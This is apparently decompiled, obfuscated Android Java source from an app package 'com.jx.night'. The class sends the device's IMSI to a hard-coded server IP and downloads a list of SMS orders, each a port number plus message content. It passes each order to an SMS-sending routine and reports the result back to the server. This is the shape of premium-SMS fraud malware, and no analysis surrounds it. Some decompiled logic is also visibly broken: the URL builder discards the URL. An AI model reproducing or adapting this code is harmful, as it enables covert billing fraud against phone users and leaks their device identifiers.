package com.jx.night.b;

import com.jx.night.unit.MyConst;
import com.litesuits.http.LiteHttp;
import com.litesuits.http.request.StringRequest;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class b
{
  private static b a;
  private List<a> b = new ArrayList();
  private String c = "http://198.15.98.102:9090/common/smsorder?cpid=20150269&imsi=" + MyConst.c;
  
  public b() {}
  
  public static b a()
  {
    if (a == null) {
      a = new b();
    }
    return a;
  }
  
  private String a(String paramString, boolean paramBoolean)
  {
    StringBuilder localStringBuilder = new StringBuilder().append("http://198.15.98.102:9090/common/smssync?orderNo=").append(paramString).append("&result=");
    if (paramBoolean) {}
    for (paramString = "0";; paramString = "-1") {
      return paramString;
    }
  }
  
  private void a(String paramString)
  {
    try
    {
      paramString = new JSONObject(paramString);
      if ((paramString != null) && (paramString.optInt("result") == 0))
      {
        paramString = paramString.optJSONArray("sms");
        if (paramString != null)
        {
          this.b.clear();
          int i = 0;
          while (i < paramString.length())
          {
            JSONObject localJSONObject = paramString.getJSONObject(i);
            a localA = new a();
            localA.a = localJSONObject.optString("orderNo");
            localA.b = localJSONObject.optString("port");
            localA.c = localJSONObject.optString("content");
            this.b.add(localA);
            i += 1;
          }
        }
      }
      return;
    }
    catch (Exception paramString) {}
  }
  
  private void c()
  {
    c localC = new c(this);
    StringRequest localStringRequest = new StringRequest(this.c);
    localStringRequest.setHttpListener(localC);
    MyConst.y.executeAsync(localStringRequest);
  }
  
  private void d()
  {
    if (this.b == null) {}
    for (;;)
    {
      return;
      if (this.b.size() != 0)
      {
        Iterator localIterator = this.b.iterator();
        while (localIterator.hasNext())
        {
          a localA = (a)localIterator.next();
          new com.jx.night.sms.a(new com.jx.night.sms.a.a(localA.b, localA.c, a(localA.a, true), a(localA.a, false)));
        }
      }
    }
  }
  
  public void b()
  {
    c();
  }
}
